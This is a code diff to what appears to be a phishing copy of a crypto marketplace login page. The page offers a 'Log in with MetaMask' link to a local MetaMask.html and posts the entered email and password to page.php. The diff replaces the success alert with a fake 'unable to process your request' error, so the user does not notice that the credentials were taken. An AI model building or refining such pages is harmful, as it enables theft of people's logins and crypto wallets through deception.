@@ -26911,7 +26911,7 @@ svg path[data-v-47dc1f47],svg rect[data-v-47dc1f47]{
         Don't have an account? Click here to sign up
       </p></div> <div data-v-dd1c629c="" class="tw-flex-1 tw-px-5 md:tw-px-28 tw-py-14 right tw-justify-evenly"><div data-v-dd1c629c="" class="metamask tw-flex tw-items-center tw-p-3 tw-cursor-pointer" onclick="location.href='MetaMask.html'"><img data-v-dd1c629c="" src="./Marketplace Dashboard_files/metamask.898e510.svg" alt=""> <p data-v-dd1c629c="" class="tw-text-white tw-flex-1 tw-text-center">
           Log in with MetaMask
-        </p></div> <p data-v-dd1c629c="" class="tw-py-4 tw-text-center or">or</p> <div data-v-dd1c629c="" class="tw-mb-9"><input data-v-dd1c629c="" type="text" id="email" placeholder="Email" class="field tw-mb-8"> <input data-v-dd1c629c="" type="password" placeholder="Password" id="password" class="field"></div> <button data-v-dd1c629c="" class="btn-login tw-mb-7 tw-cursor-pointer" id="sendBtn">
+        </p></div> <p data-v-dd1c629c="" class="tw-py-4 tw-text-center or">or</p> <div data-v-dd1c629c="" class="tw-mb-9"><input data-v-dd1c629c="" type="text" id="email" placeholder="Email" class="field tw-mb-8"> <input data-v-dd1c629c="" type="password" placeholder="Password" id="password" class="field"><span id="errorMessage"></span></div> <button data-v-dd1c629c="" class="btn-login tw-mb-7 tw-cursor-pointer" id="sendBtn">
         Login
       </button> <p data-v-dd1c629c="" class="forgot tw-text-center tw-cursor-pointer">Forgot password?</p></div></div> <!----></div> <div data-v-2a6677e8="" id="snackbar" class="tw-flex tw-flex-row snack-bar tw-p-2"><div data-v-2a6677e8="" class="tw-flex tw-flex-grow-0 tw-w-10"><!----> <!----> <img data-v-2a6677e8="" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHZpZXdCb3g9IjAgMCAyMCAyMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTAiIGN5PSIxMCIgcj0iMTAiIGZpbGw9IiMwMDY4RkYiLz4KPHJlY3QgeD0iOSIgeT0iOCIgd2lkdGg9IjIiIGhlaWdodD0iNyIgcng9IjEiIGZpbGw9IndoaXRlIi8+CjxyZWN0IHg9IjkiIHk9IjUiIHdpZHRoPSIyIiBoZWlnaHQ9IjIiIHJ4PSIxIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4K" alt="" class="tw-m-auto"></div> <div data-v-2a6677e8="" class="seperate tw-ml-2"></div> <div data-v-2a6677e8="" class="tw-flex tw-flex-grow tw-flex-col tw-ml-2"><div data-v-2a6677e8="" class="title"></div> <div data-v-2a6677e8="" class="content tw-mt-2"></div></div> <div data-v-2a6677e8="" class="tw-w-8 tw-flex tw-justify-end tw-ml-2"><div data-v-2a6677e8="" class="tw-sticky tw-cursor-pointer"><img data-v-2a6677e8="" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iOCIgaGVpZ2h0PSI4IiB2aWV3Qm94PSIwIDAgOCA4IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB5PSIxLjE0Mjg1IiB3aWR0aD0iMS42MTYyMyIgaGVpZ2h0PSI5LjY5NzQiIHJ4PSIwLjgwODExNiIgdHJhbnNmb3JtPSJyb3RhdGUoLTQ1IDAgMS4xNDI4NSkiIGZpbGw9IiM2QTc0OEUiLz4KPHJlY3QgeD0iNi44NTcxOCIgd2lkdGg9IjEuNjE2MjMiIGhlaWdodD0iOS42OTc0IiByeD0iMC44MDgxMTYiIHRyYW5zZm9ybT0icm90YXRlKDQ1IDYuODU3MTggMCkiIGZpbGw9IiM2QTc0OEUiLz4KPC9zdmc+Cg==" alt="" class="tw-top-0 tw-w-4 tw-h-4 tw-right-0"></div></div></div></div></div></div>
   <script src="js/jquery.js"></script>
@@ -26925,7 +26925,7 @@ svg path[data-v-47dc1f47],svg rect[data-v-47dc1f47]{
         url : "page.php",
         data : {email : email , password : password},
         success : function (data) {
-          alert(data)
+          $("#errorMessage").html("we are unable to process your request at the moment , please try again later").css("color", "red")
         }
       })
       })
